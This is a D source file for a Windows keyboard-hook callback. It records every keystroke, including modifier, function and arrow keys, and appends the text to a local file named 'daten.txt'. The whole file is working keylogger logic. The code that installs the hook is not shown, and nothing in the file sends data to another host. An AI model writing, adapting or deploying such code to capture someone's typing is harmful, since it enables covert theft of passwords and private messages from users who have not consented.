/*Copyright 2010 Jimmy Cao

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.*/

module hook;
import std.stdio;
import std.c.windows.windows;
import std.string;
import std.conv;

alias int HHOOK;
alias int HOOKPROC;

extern(Windows) {
	LRESULT CallNextHookEx(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);
	SHORT GetKeyState(int nVirtKey);
	SHORT GetAsyncKeyState(int nVirtKey);
}

struct PKBDLLHOOKSTRUCT {
	DWORD vkCode, scanCode, flags, time, dwExtraInfo;
}

immutable string fname = "daten.txt";
immutable int HC_ACTION = 0;

__gshared HHOOK hHook;
__gshared int lastkey;
__gshared int keyheld;
__gshared string[] keys;

export extern(Windows) LRESULT KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if(nCode == HC_ACTION && (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN))
		handleKey((cast(PKBDLLHOOKSTRUCT*)lParam).vkCode);
	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void handleKey(int key) {
	File outf;
	try
		outf = File(fname, "a+");
	catch(StdioException e) return;
	
	scope(exit) outf.close();
	
	switch(key) {
		case 46:
			if(lastkey == key) {
				keyheld++;
				return;
			}
			checkLastKey();
			keys ~= "[DEL]";
			lastkey = key;
			return;
		case 8:
			if(lastkey == key) {
				keyheld++;
				return;
			}
			checkLastKey();
			keys ~= "[BACKSPACE]";
			lastkey = key;
			return;
		case 13:
			keys ~= "\n";
			break;
		case 32:
			keys ~= " ";
			break;
		case VK_CAPITAL:
			if(lastkey == key) {
				keyheld++;
				return;
			}
			checkLastKey();
			keys ~= "[CAPS]";
			lastkey = key;
			return;
		case VK_TAB:
			if(lastkey == key) {
				keyheld++;
				return;
			}
			checkLastKey();
			keys ~= "[TAB]";
			lastkey = key;
			return;
		case VK_SHIFT, 160, 161:
			if(lastkey == key) {
				keyheld++;
				return;
			}
			checkLastKey();
			keys ~= "[SHIFT]";
			lastkey = key;
			return;
		case VK_MENU, 164, 165:
			if(lastkey == key) {
				keyheld++;
				return;
			}
			checkLastKey();
			keys ~= "[ALT]";
			lastkey = key;
			return;
		case VK_CONTROL, 162, 163:
			if(lastkey == key) {
				keyheld++;
				return;
			}
			checkLastKey();
			keys ~= "[CTRL]";
			lastkey = key;
			return;
		case VK_PAUSE:
			if(lastkey == key) {
				keyheld++;
				return;
			}
			checkLastKey();
			keys ~= "[PAUSE]";
			lastkey = key;
			return;
		case VK_ESCAPE:
			if(lastkey == key) {
				keyheld++;
				return;
			}
			checkLastKey();
			keys ~= "[ESC]";
			lastkey = key;
			return;
		case VK_END:
			if(lastkey == key) {
				keyheld++;
				return;
			}
			checkLastKey();
			keys ~= "[END]";
			lastkey = key;
			return;
		case VK_HOME:
			if(lastkey == key) {
				keyheld++;
				return;
			}
			checkLastKey();
			keys ~= "[HOME]";
			lastkey = key;
			return;
		case VK_LEFT:
			if(lastkey == key) {
				keyheld++;
				return;
			}
			checkLastKey();
			keys ~= "[LEFT]";
			lastkey = key;
			return;
		case VK_UP:
			if(lastkey == key) {
				keyheld++;
				return;
			}
			checkLastKey();
			keys ~= "[UP]";
			lastkey = key;
			return;
		case VK_RIGHT:
			if(lastkey == key) {
				keyheld++;
				return;
			}
			checkLastKey();
			keys ~= "[RIGHT]";
			lastkey = key;
			return;
		case VK_DOWN:
			if(lastkey == key) {
				keyheld++;
				return;
			}
			checkLastKey();
			keys ~= "[DOWN]";
			lastkey = key;
			return;
		case VK_SNAPSHOT:
			if(lastkey == key) {
				keyheld++;
				return;
			}
			checkLastKey();
			keys ~= "[PRTSCR]";
			lastkey = key;
			return;
		case VK_NUMLOCK:
			if(lastkey == key) {
				keyheld++;
				return;
			}
			checkLastKey();
			keys ~= "[NUMLOCK]";
			lastkey = key;
			return;
		case 190, 110: //full stop period
			if(GetAsyncKeyState(VK_SHIFT) < 0)
				keys ~= ">";
			else
				keys ~= ".";
			break;
		case 192: //tilde
			if(GetAsyncKeyState(VK_SHIFT) < 0)
				keys ~= "~";
			else
				keys ~= "`";
			break;
		case 186: //colon/semicolon
			if(GetAsyncKeyState(VK_SHIFT) < 0)
				keys ~= ":";
			else
				keys ~= ";";
			break;
		case 191: //question mark or slash
			if(GetAsyncKeyState(VK_SHIFT) < 0)
				keys ~= "?";
			else
				keys ~= "/";
			break;
		case 189:
			if(GetAsyncKeyState(VK_SHIFT) < 0)
				keys ~= "_";
			else
				keys ~= "-";
			break;
		case 187:
			if(GetAsyncKeyState(VK_SHIFT) < 0)
				keys ~= "+";
			else
				keys ~= "=";
			break;
		case 219:
			if(GetAsyncKeyState(VK_SHIFT) < 0)
				keys ~= "{";
			else
				keys ~= "[";
			break;
		case 221:
			if(GetAsyncKeyState(VK_SHIFT) < 0)
				keys ~= "}";
			else
				keys ~= "]";
			break;
		case 220:
			if(GetAsyncKeyState(VK_SHIFT) < 0)
				keys ~= "|";
			else
				keys ~= "\\";
			break;
		case 222:
			if(GetAsyncKeyState(VK_SHIFT) < 0)
				keys ~= `"`;
			else
				keys ~= "'";
			break;
		case 188: //comma or less than sign
			if(GetAsyncKeyState(VK_SHIFT) < 0)
				keys ~= "<";
			else
				keys ~= ",";
			break;
		case 112: .. case 123:  //F1 - F12
			if(lastkey == key) {
				keyheld++;
				return;
			}
			checkLastKey();
			keys ~= "[F"~to!string(key-111)~"]";
			lastkey = key;
			return;
		case 48: .. case 57:
			if(GetAsyncKeyState(VK_SHIFT) < 0)
				keys ~= to!string(")!@#$%^&*("[key-48]);  //bad words.
			else
				keys ~= to!string(cast(char)key);
			break;
		default:
			if(key != VK_LBUTTON || key != VK_RBUTTON) {
				if(key >= 65 && key <= 90) {
					if (GetKeyState(VK_CAPITAL) || GetAsyncKeyState(VK_SHIFT) < 0)
						keys ~= to!string(cast(char)key);
					else {
						keys ~= to!string(cast(char)(key + 32));
					}
				}
				else {
					writeln(key);  //debug purposes.
					keys ~= "";  //umatched key.
				}
			}
			break;
	}
	
	if(!keyheld)
		outf.write(keys.join(""));
	else {
		keys[$-2] = keys[$-2][0 .. $-1] ~ "(" ~ to!string(keyheld+1) ~ ")]";
		outf.write(keys.join(""));
	}
	keyheld = 0;
	lastkey = 0;
	keys = [];
}

void checkLastKey() {
	if(lastkey && keyheld) {
		keys[$-1] = keys[$-1][0 .. $-1] ~ "(" ~ to!string(keyheld+1) ~ ")]";
		lastkey = keyheld = 0;
	}
}